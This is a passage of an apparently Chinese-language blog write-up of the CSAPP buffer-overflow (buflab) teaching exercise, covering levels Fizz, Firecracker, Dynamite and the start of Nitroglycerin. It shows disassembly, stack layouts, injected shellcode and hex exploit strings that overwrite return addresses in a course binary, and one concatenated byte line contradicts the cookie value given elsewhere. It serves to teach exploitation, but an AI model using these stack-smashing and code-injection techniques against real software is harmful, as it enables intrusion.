+</span></span><span class="line"><span class="cl"> 8048c6b:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+</span></span><span class="line"><span class="cl"> 8048c72:	e8 04 07 00 00       	call   804937b &lt;validate&gt;
+</span></span><span class="line"><span class="cl"> 8048c77:	eb 18                	jmp    8048c91 &lt;fizz+0x4f&gt;
+</span></span><span class="line"><span class="cl"> 8048c79:	89 44 24 08          	mov    %eax,0x8(%esp)
+</span></span><span class="line"><span class="cl"> 8048c7d:	c7 44 24 04 40 a3 04 	movl   $0x804a340,0x4(%esp)
+</span></span><span class="line"><span class="cl"> 8048c84:	08 
+</span></span><span class="line"><span class="cl"> 8048c85:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+</span></span><span class="line"><span class="cl"> 8048c8c:	e8 2f fd ff ff       	call   80489c0 &lt;__printf_chk@plt&gt;
+</span></span><span class="line"><span class="cl"> 8048c91:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
+</span></span><span class="line"><span class="cl"> 8048c98:	e8 63 fc ff ff       	call   8048900 &lt;exit@plt&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>栈结构示意图：</p>
+<div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th style="text-align: left">地址</th>
+					<th style="text-align: left">解释</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: left">ebp + 8 字节</td>
+					<td style="text-align: left">val</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">返回地址</td>
+					<td style="text-align: left">应当为 fizz 的首地址</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">ebp</td>
+					<td style="text-align: left">占4字节</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">&hellip;</td>
+					<td style="text-align: left"></td>
+			</tr>
+			<tr>
+					<td style="text-align: left">&hellip;</td>
+					<td style="text-align: left"></td>
+			</tr>
+			<tr>
+					<td style="text-align: left">ebp-40字节</td>
+					<td style="text-align: left">buf数组的初始地址</td>
+			</tr>
+	</tbody>
+</table></div>
+<p>同样是在buf中插入cookie值，注意函数参数在函数返回地址之前，所以，cookie值应该插入在ebp+8起始的八个字节中，所以在 exploit.txt 中填入如下答案即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00 00 00 00 00 00 00 00
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
+</span></span><span class="line"><span class="cl">00 00 00 00 42 8c 04 08
+</span></span><span class="line"><span class="cl">00 00 00 00 86 07 ce 2b 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img alt="图3" class="gallery-image" data-flex-basis="2157px" data-flex-grow="898" height="185" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228165816937.png" srcset="/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228165816937_hu_c3827aa3ecc9c629.png 800w, /en/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228165816937_hu_cbc19f9665ac5d5.png 1600w, /en/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228165816937.png 1663w" width="1663"></p>
+<h3 id="level2firecracker">level2：Firecracker
+</h3><p>目标：调用bang函数，并且修改global_value为自己的cookie值</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">08048c9d &lt;bang&gt;:
+</span></span><span class="line"><span class="cl"> 8048c9d:	55                   	push   %ebp
+</span></span><span class="line"><span class="cl"> 8048c9e:	89 e5                	mov    %esp,%ebp
+</span></span><span class="line"><span class="cl"> 8048ca0:	83 ec 18             	sub    $0x18,%esp
+</span></span><span class="line"><span class="cl"> 8048ca3:	a1 00 d1 04 08       	mov    0x804d100,%eax
+</span></span><span class="line"><span class="cl"> 8048ca8:	3b 05 08 d1 04 08    	cmp    0x804d108,%eax
+</span></span><span class="line"><span class="cl"> 8048cae:	75 26                	jne    8048cd6 &lt;bang+0x39&gt;
+</span></span><span class="line"><span class="cl"> 8048cb0:	89 44 24 08          	mov    %eax,0x8(%esp)
+</span></span><span class="line"><span class="cl"> 8048cb4:	c7 44 24 04 60 a3 04 	movl   $0x804a360,0x4(%esp)
+</span></span><span class="line"><span class="cl"> 8048cbb:	08 
+</span></span><span class="line"><span class="cl"> 8048cbc:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+</span></span><span class="line"><span class="cl"> 8048cc3:	e8 f8 fc ff ff       	call   80489c0 &lt;__printf_chk@plt&gt;
+</span></span><span class="line"><span class="cl"> 8048cc8:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
+</span></span><span class="line"><span class="cl"> 8048ccf:	e8 a7 06 00 00       	call   804937b &lt;validate&gt;
+</span></span><span class="line"><span class="cl"> 8048cd4:	eb 18                	jmp    8048cee &lt;bang+0x51&gt;
+</span></span><span class="line"><span class="cl"> 8048cd6:	89 44 24 08          	mov    %eax,0x8(%esp)
+</span></span><span class="line"><span class="cl"> 8048cda:	c7 44 24 04 0c a5 04 	movl   $0x804a50c,0x4(%esp)
+</span></span><span class="line"><span class="cl"> 8048ce1:	08 
+</span></span><span class="line"><span class="cl"> 8048ce2:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+</span></span><span class="line"><span class="cl"> 8048ce9:	e8 d2 fc ff ff       	call   80489c0 &lt;__printf_chk@plt&gt;
+</span></span><span class="line"><span class="cl"> 8048cee:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
+</span></span><span class="line"><span class="cl"> 8048cf5:	e8 06 fc ff ff       	call   8048900 &lt;exit@plt&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>已知变量的内存地址，我们可以通过插入恶意代码来修改变量的值，汇编代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-s" data-lang="s"><span class="line"><span class="cl"><span class="c1"># 改变 global_value</span>
+</span></span><span class="line"><span class="cl"><span class="n">movl</span> <span class="o">$</span><span class="mh">0x2bce0786</span><span class="p">,</span><span class="mh">0x804d100</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 将 bang 函数的首地址压入栈</span>
+</span></span><span class="line"><span class="cl"><span class="n">pushl</span> <span class="o">$</span><span class="mh">0x08048c9d</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下来就是将汇编语言转换成十六进制的机器代码了。使用<code>gcc -m32 -c</code> 和 <code>objdump -d</code>可以得到转换之后的文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00000000 &lt;.text&gt;:
+</span></span><span class="line"><span class="cl">   0:	c7 05 00 d1 04 08 86 	movl   $0x2bce0786,0x804d100
+</span></span><span class="line"><span class="cl">   7:	07 ce 2b 
+</span></span><span class="line"><span class="cl">   a:	68 9d 8c 04 08       	push   $0x8048c9d
+</span></span><span class="line"><span class="cl">   f:	c3                   	ret    
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么所有的字节就是 <code>c7 05 00 d1 04 08 70 5a 2d 36 68 9d 8c 04 08 c3</code>。接下来回到 getbuff 的汇编代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">080491f4 &lt;getbuf&gt;:
+</span></span><span class="line"><span class="cl"> 80491f4:	55                   	push   %ebp
+</span></span><span class="line"><span class="cl"> 80491f5:	89 e5                	mov    %esp,%ebp
+</span></span><span class="line"><span class="cl"> 80491f7:	83 ec 38             	sub    $0x38,%esp
+</span></span><span class="line"><span class="cl"> 80491fa:	8d 45 d8             	lea    -0x28(%ebp),%eax
+</span></span><span class="line"><span class="cl"> 80491fd:	89 04 24             	mov    %eax,(%esp)
+</span></span><span class="line"><span class="cl"> 8049200:	e8 f5 fa ff ff       	call   8048cfa &lt;Gets&gt;
+</span></span><span class="line"><span class="cl"> 8049205:	b8 01 00 00 00       	mov    $0x1,%eax
+</span></span><span class="line"><span class="cl"> 804920a:	c9                   	leave  
+</span></span><span class="line"><span class="cl"> 804920b:	c3                   	ret  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>构造栈的结构：</p>
+<div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th style="text-align: left">地址</th>
+					<th style="text-align: left">解释</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: left">0x55683e78</td>
+					<td style="text-align: left">入侵代码的起始地址，也就是调用get函数前eax寄存器的值</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">ebp</td>
+					<td style="text-align: left"></td>
+			</tr>
+			<tr>
+					<td style="text-align: left">&hellip;</td>
+					<td style="text-align: left"></td>
+			</tr>
+			<tr>
+					<td style="text-align: left">ret</td>
+					<td style="text-align: left"></td>
+			</tr>
+			<tr>
+					<td style="text-align: left">push $0x08048c9d</td>
+					<td style="text-align: left">0x08048c9d为bang函数的起始地址</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">movl $0x2bce0786,0x804d100</td>
+					<td style="text-align: left">0x804d100为global_value变量的内存地址，0x2bce0786为hack对应的cookie值,当前地址为buf数组的初始地址 rsp-40字节</td>
+			</tr>
+	</tbody>
+</table></div>
+<p>结合以上信息，构造下列答案：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c7 05 00 d1 04 08 86 07
+</span></span><span class="line"><span class="cl">ce 2b 68 9d 8c 04 08 c3
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
+</span></span><span class="line"><span class="cl">00 00 00 00 78 3e 68 55
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行结果如下：</p>
+<p><img alt="图4" class="gallery-image" data-flex-basis="2208px" data-flex-grow="920" height="180" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228172102205.png" srcset="/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228172102205_hu_3ce8f0a8b8c2d0ca.png 800w, /en/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228172102205_hu_373e104222b9e682.png 1600w, /en/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228172102205.png 1656w" width="1656"></p>
+<h3 id="level3-dynamite">level3： Dynamite
+</h3><p>目标：注入一段能够修改 getbuf 返回值的代码，返回值从 1 改成 cookie 值，此外还需要还原所有破坏，继续运行 test 的剩下部分，注意getbuf函数开头的push %ebp。</p>
+<p>同样回到 getbuff 的汇编代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-s" data-lang="s"><span class="line"><span class="cl"><span class="m">080491</span><span class="n">f4</span> <span class="o">&lt;</span><span class="n">getbuf</span><span class="o">&gt;:</span>
+</span></span><span class="line"><span class="cl"><span class="m">80491</span><span class="n">f4</span><span class="o">:</span>	<span class="m">55</span>                   	<span class="n">push</span>   <span class="o">%ebp
+</span></span></span><span class="line"><span class="cl"><span class="o">80491f5:	89 e5                	mov    %</span><span class="n">esp</span><span class="p">,</span><span class="o">%ebp
+</span></span></span><span class="line"><span class="cl"><span class="o">80491f7:	83 ec 38             	sub    $0x38,%</span><span class="n">esp</span>
+</span></span><span class="line"><span class="cl"><span class="m">80491</span><span class="n">fa</span><span class="o">:</span>	<span class="m">8</span><span class="n">d</span> <span class="m">45</span> <span class="n">d8</span>             	<span class="n">lea</span>    <span class="m">-0</span><span class="nf">x28</span><span class="p">(</span><span class="o">%ebp),%</span><span class="n">eax</span>
+</span></span><span class="line"><span class="cl"><span class="m">80491</span><span class="n">fd</span><span class="o">:</span>	<span class="m">89</span> <span class="m">04</span> <span class="m">24</span>             	<span class="n">mov</span>    <span class="o">%eax,(%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="m">8049200</span><span class="o">:</span>	<span class="n">e8</span> <span class="n">f5</span> <span class="n">fa</span> <span class="n">ff</span> <span class="n">ff</span>       	<span class="n">call</span>   <span class="m">8048</span><span class="n">cfa</span> <span class="o">&lt;</span><span class="n">Gets</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="m">8049205</span><span class="o">:</span>	<span class="n">b8</span> <span class="m">01</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>       	<span class="n">mov</span>    <span class="o">$</span><span class="mh">0x1</span><span class="p">,</span>%<span class="n">eax</span>
+</span></span><span class="line"><span class="cl"><span class="m">804920</span><span class="n">a</span><span class="o">:</span>	<span class="n">c9</span>                   	<span class="n">leave</span>  
+</span></span><span class="line"><span class="cl"><span class="m">804920</span><span class="n">b</span><span class="o">:</span>	<span class="n">c3</span>                   	<span class="n">ret</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意到调用Gets函数后，会将eax寄存器置1，于是我们需要跳过这条命令，再修改eax寄存器的值，最后返回到调用getbuf函数的下一条命令，不能回到getbuf函数的leave命令，因为返回test函数的地址已经没了，如果返回到getbuf函数的leave命令，那么还需在ret后面添加test函数的返回地址。</p>
+<p>结合 test 的前几行代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-s" data-lang="s"><span class="line"><span class="cl"> <span class="m">08048</span><span class="n">daa</span> <span class="o">&lt;</span><span class="n">test</span><span class="o">&gt;:</span>
+</span></span><span class="line"><span class="cl"> <span class="m">8048</span><span class="n">daa</span><span class="o">:</span>	<span class="m">55</span>                   	<span class="n">push</span>   <span class="o">%ebp
+</span></span></span><span class="line"><span class="cl"><span class="o"> 8048dab:	89 e5                	mov    %</span><span class="n">esp</span><span class="p">,</span><span class="o">%ebp
+</span></span></span><span class="line"><span class="cl"><span class="o"> 8048dad:	53                   	push   %</span><span class="n">ebx</span>
+</span></span><span class="line"><span class="cl"> <span class="m">8048</span><span class="n">dae</span><span class="o">:</span>	<span class="m">83</span> <span class="n">ec</span> <span class="m">24</span>             	<span class="n">sub</span>    <span class="o">$</span><span class="mh">0x24</span><span class="p">,</span><span class="o">%esp
+</span></span></span><span class="line"><span class="cl"><span class="o"> 8048db1:	e8 da ff ff ff       	call   8048d90 &lt;uniqueval&gt;
+</span></span></span><span class="line"><span class="cl"><span class="o"> 8048db6:	89 45 f4             	mov    %</span><span class="n">eax</span><span class="p">,</span><span class="m">-0</span><span class="nf">xc</span><span class="p">(</span><span class="o">%ebp)
+</span></span></span><span class="line"><span class="cl"><span class="o"> 8048db9:	e8 36 04 00 00       	call   80491f4 &lt;getbuf&gt;
+</span></span></span><span class="line"><span class="cl"><span class="o"> 8048dbe:	89 c3                	mov    %</span><span class="n">eax</span><span class="p">,</span>%<span class="n">ebx</span>
+</span></span><span class="line"><span class="cl"> <span class="m">8048</span><span class="n">dc0</span><span class="o">:</span>	<span class="n">e8</span> <span class="n">cb</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span>       	<span class="n">call</span>   <span class="m">8048</span><span class="n">d90</span> <span class="o">&lt;</span><span class="n">uniqueval</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以应当构造 Gets 的栈帧如下：</p>
+<div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th style="text-align: left">地址</th>
+					<th style="text-align: left">解释</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: left">返回地址</td>
+					<td style="text-align: left">设置成缓冲区的首地址</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">ebp</td>
+					<td style="text-align: left">占用4字节</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">&hellip;</td>
+					<td style="text-align: left">&hellip;</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">ebp - 40 字节</td>
+					<td style="text-align: left">buf 数组的初始地址，从这里开始注入修改 eax 的代码</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">&hellip;</td>
+					<td style="text-align: left">&hellip;</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">ebp - 0x38</td>
+					<td style="text-align: left">esp，栈帧首地址</td>
+			</tr>
+	</tbody>
+</table></div>
+<p>构造的汇编命令如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-s" data-lang="s"><span class="line"><span class="cl"><span class="m">00000000</span> <span class="o">&lt;</span><span class="n">.text</span><span class="o">&gt;:</span>
+</span></span><span class="line"><span class="cl">   <span class="m">0</span><span class="o">:</span>	<span class="n">b8</span> <span class="m">86</span> <span class="m">07</span> <span class="n">ce</span> <span class="m">2</span><span class="n">b</span>       	<span class="n">mov</span>    <span class="o">$</span><span class="mh">0x2bce0786</span><span class="p">,</span>%<span class="n">eax</span>
+</span></span><span class="line"><span class="cl">   <span class="m">5</span><span class="o">:</span>	<span class="m">68</span> <span class="m">0</span><span class="n">a</span> <span class="m">92</span> <span class="m">04</span> <span class="m">08</span>       	<span class="n">push</span>   <span class="o">$</span><span class="mh">0x804920a</span>
+</span></span><span class="line"><span class="cl">   <span class="n">a</span><span class="o">:</span>	<span class="n">c3</span>                   	<span class="n">ret</span>    
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>为了防止对栈的破坏，ebp 是被调用者保存寄存器，是 test 在调用 getbuf 之后，getbuf 首先就就压进了栈帧里。同时为了使程序继续运行，需要保证 ebp 不被破坏。使用 gdb，在 getbuf 的第一行 <code>0x080491f4 </code>处打下断点，研究此时ebp 的值，ebp的值为0x55683ed0。</p>
+<p>所以构造的答案为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">b8 86 07 ce 2b 68 be 8d
+</span></span><span class="line"><span class="cl">04 08 c3 00 00 00 00 00
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
+</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
+</span></span><span class="line"><span class="cl">d0 3e 68 55 78 3e 68 55
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后的运行结果为：</p>
+<p><img alt="图5" class="gallery-image" data-flex-basis="2585px" data-flex-grow="1077" height="154" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228194621167.png" srcset="/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228194621167_hu_9bde6059c2e1d82d.png 800w, /en/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228194621167_hu_c394a4b88724dc59.png 1600w, /en/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228194621167.png 1659w" width="1659"></p>
+<h3 id="level4nitroglycerin这个实验的解题思路有点没有理解">level4：Nitroglycerin（这个实验的解题思路有点没有理解）
+</h3><p>目标：使用-n参数进入该实验，该实验会连续调用5次getbufn，要求我们每次在调用getbufn函数后返回cookie值，而不是1，同时还需恢复所有破坏。</p>
+<p>和前面不同的是，这一个阶段由于使用的是 getbufn 和 testn 函数，并且需要将一个相同的字符串输入五次。所以需要使用命令-n</p>
+<p>同时，文档也指出在 getbufn 中有<code>#define KABOOM_BUFFER_SIZE 512</code>，所以缓冲区大小为 512.</p>
+<p>这次研究 getbufn 的汇编代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-s" data-lang="s"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disas</span>
+</span></span><span class="line"><span class="cl"><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="kr">for</span> <span class="kr">function</span> <span class="n">getbufn</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x0804920c</span> <span class="o">&lt;</span><span class="m">+0</span><span class="o">&gt;:</span>	<span class="n">push</span>   <span class="o">%ebp
+</span></span></span><span class="line"><span class="cl"><span class="o">   0x0804920d &lt;+1&gt;:	mov    %</span><span class="n">esp</span><span class="p">,</span><span class="o">%ebp
+</span></span></span><span class="line"><span class="cl"><span class="o">    # esp 减去了 536 个字节
+</span></span></span><span class="line"><span class="cl"><span class="o">   0x0804920f &lt;+3&gt;:	sub    $0x218,%</span><span class="n">esp</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># buf 的首地址空间离 ebp 有 520 个字节</span>
+</span></span><span class="line"><span class="cl"><span class="o">=&gt;</span> <span class="mh">0x08049215</span> <span class="o">&lt;</span><span class="m">+9</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="m">-0</span><span class="nf">x208</span><span class="p">(</span><span class="o">%ebp),%</span><span class="n">eax</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x0804921b</span> <span class="o">&lt;</span><span class="m">+15</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">%eax,(%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x0804921e</span> <span class="o">&lt;</span><span class="m">+18</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x8048cfa</span> <span class="o">&lt;</span><span class="n">Gets</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049223</span> <span class="o">&lt;</span><span class="m">+23</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="o">$</span><span class="mh">0x1</span><span class="p">,</span>%<span class="n">eax</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049228</span> <span class="o">&lt;</span><span class="m">+28</span><span class="o">&gt;:</span>	<span class="n">leave</span>  
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049229</span> <span class="o">&lt;</span><span class="m">+29</span><span class="o">&gt;:</span>	<span class="n">ret</span>    
+</span></span><span class="line"><span class="cl"><span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在这一阶段，getbufn 会调用 5 次，每次的储存的 ebp 都不一样，官方文档表示这个差值会在 +- 240 的样子：</p>
+<p><a class="link" href="https://billc.oss-cn-shanghai.aliyuncs.com/img/2020-04-13-163954.png"  target="_blank" rel="noopener"
+    ><img alt="img" class="gallery-image" data-flex-basis="1932px" data-flex-grow="805" height="272" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://billc.oss-cn-shanghai.aliyuncs.com/img/2020-04-13-163954.png" srcset="/2020-04-13-163954_6205755070886081346_hu_82d4d9cf5fe782f2.png 800w, /2020-04-13-163954_6205755070886081346_hu_8df2014025366f5.png 1600w, https://billc.oss-cn-shanghai.aliyuncs.com/img/2020-04-13-163954.png 2190w" width="2190"></a></p>
+<p>接下来使用 gdb，在 getbufn 打下断点，连续 5 次查看 % ebp 的值，可以得到这五次 ebp 的值分别是在：</p>
+<div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th style="text-align: left">No</th>
+					<th style="text-align: left">p/x $ebp</th>
+					<th style="text-align: left">p/x $ebp - 0x208</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: left">1</td>
+					<td style="text-align: left">0x55683110</td>
+					<td style="text-align: left">0x55682f08</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">2</td>
+					<td style="text-align: left">0x556830b0</td>
+					<td style="text-align: left">0x55682ea8</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">3</td>
+					<td style="text-align: left">0x55683100</td>
+					<td style="text-align: left">0x55682ef8</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">4</td>
+					<td style="text-align: left">0x55683110</td>
+					<td style="text-align: left">0x55682f08</td>
+			</tr>
+			<tr>
+					<td style="text-align: left">5</td>
+					<td style="text-align: left">0x55683180</td>
+					<td style="text-align: left">0x55682f78</td>
+			</tr>
+	</tbody>
+</table></div>
+<p>对应的，buf 的起始地址就是每一次记的 ebp 减去 208，也就是 520 字节。</p>
+<p>所以每一次的地址是无法确认的。英文文档中介绍了可以使用 <code>nop sled</code> 的方法来解决这一问题。参考 CSAPP 教材中的介绍：</p>
+<p><img alt="图6" class="gallery-image" data-flex-basis="642px" data-flex-grow="267" height="610" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="https://billc.oss-cn-shanghai.aliyuncs.com/img/2020-04-13-163955.png" srcset="/2020-04-13-163955_11162081203821949248_hu_bff4f4a99965baa3.png 800w, /2020-04-13-163955_11162081203821949248_hu_e542df9d4a6b7c00.png 1600w, https://billc.oss-cn-shanghai.aliyuncs.com/img/2020-04-13-163955.png 1632w" width="1632"></p>
